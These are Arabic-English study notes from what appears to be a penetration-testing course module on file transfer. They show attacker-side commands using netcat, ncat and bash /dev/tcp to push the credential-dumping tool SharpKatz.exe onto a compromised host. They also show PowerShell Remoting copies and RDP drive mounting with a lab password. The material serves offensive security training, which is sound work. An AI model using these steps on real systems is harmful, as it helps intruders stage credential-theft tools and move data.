- في الموديول ده هنشرح طرق تانيه لنقل الملفات
---
## Netcat
- اداة الnetcat او nc زي مابنقول عليها دي computer network utility عشان تقرأ الnetowork connections باستخدام الTCP او الUDP وممكن نستعملها عشان ننقل ملفات برضو
---
## File Transfer with Netcat and Ncat
- اول حاجه لما ناخد access علي جهاز الvictim نفتح عنده بورت
#### NetCat - Compromised Machine - Listening on Port 8000

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
- أنت هنا بتطلب من نظام التشغيل أي حاجة هتجيلك من خلال الاتصال ده، متطبعهاش على الشاشة، خزنها في ملف جديد اسمه `SharpKatz.exe`

- لو هنستخدم اداة ncat بدل nc هنكتب نفس الcommand بس نحط الفلاج `recv-only` عشان نقفل الاتصال بعد ما الملف يتنقل علاطول
#### Ncat - Compromised Machine - Listening on Port 8000

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
- ده كده اللي هنعمله علي جهاز الvictim تعالي بقي نشوف هنعمل ايه من جهازنا احنا كا attackers
#### Netcat - Attack Host - Sending File to Compromised machine

```shell-session
[!bash!]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
[!bash!]$ # Example using Original Netcat
[!bash!]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
- The option `-q 0` will tell Netcat to close the connection once it finishes
- لو هنستخدم الncat هنستخدم فلاج ال`send-only` عشان يقفل الاتصال لما يخلص نقل الملف
#### Ncat - Attack Host - Sending File to Compromised machine

```shell-session
[!bash!]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
[!bash!]$ # Example using Ncat
[!bash!]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
#### Attack Host - Sending File as Input to Netcat

```shell-session
[!bash!]$ # Example using Original Netcat
[!bash!]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Let's do the same with Ncat:

#### Attack Host - Sending File as Input to Ncat

```shell-session
[!bash!]$ # Example using Ncat
[!bash!]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
طب لو مفيش اداة الnetcat او الncat؟ يبقي هنستخدم الbash من خلال `dev/TCP`
#### NetCat - Sending File as Input to Netcat

```shell-session
[!bash!]$ # Example using Original Netcat
[!bash!]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Ncat

```shell-session
[!bash!]$ # Example using Ncat
[!bash!]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
**Note:** The same operation can be used to transfer files from the compromised host to our Pwnbox.

---
## PowerShell Session File Transfer

- هنا هنستخدم الpowershell بطريقه مختلفه عن اللي شرحناها قبل كده عشان ننقل الملفات وده هيتم عن طريق **الPowerShell Remoting** او الWinRM
- الPowershell Remoting بتسمح لينا اننا ننفذ اسكريبتات واوامر علي الremote computer باستخدام الpowershell sessions
- الadmins بيستخدمو الpowershell remoting عشان يتحكمو فالأجهوه علي الشبكه
- الpowershell remoting بتشتغل by default انها تشغل HTTP و HTTPS listener الlisteners دول بيرنو علي بورت 5985 للHTTP و5986 للHTTPS
- عشان افتح session علي الremote computer محتاج admin access ولازم اننا نكون من Remote Management Users Group
- We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.
#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

#### Create a PowerShell Remoting Session to DATABASE01

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.
#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
---
## RDP
- الRDP هو Remote Desktop Protocol بيستخدم عشان تاخد remote access علي جهاز تاني
- احنا بقي ممكن ننقل ملفات باستخدام الRDP ده من خلال الright-click عادي وندوس copy لأن الremote access بيكون GUI
- لو انت فاتح من linux يبقي هنستخدم اداة زي `xfreerdp` او `rdpdesktop`
- في طريقه تانيه لنقل الملفات باستخدام الRDP من غير right-click وكده وهي انك بتخلي **مجلد على جهازك أنت** (جهاز الكالي لينكس أو الـPwnbox) يظهر كأنه **"قُرص صلب (Hard Drive)" جديد** جوه واجهة ويندوز البعيدة اللي أنت فاتحها
#### Mounting a Linux Folder Using rdesktop

```shell-session
0xTroj6n@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

```shell-session
0xTroj6n@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
---
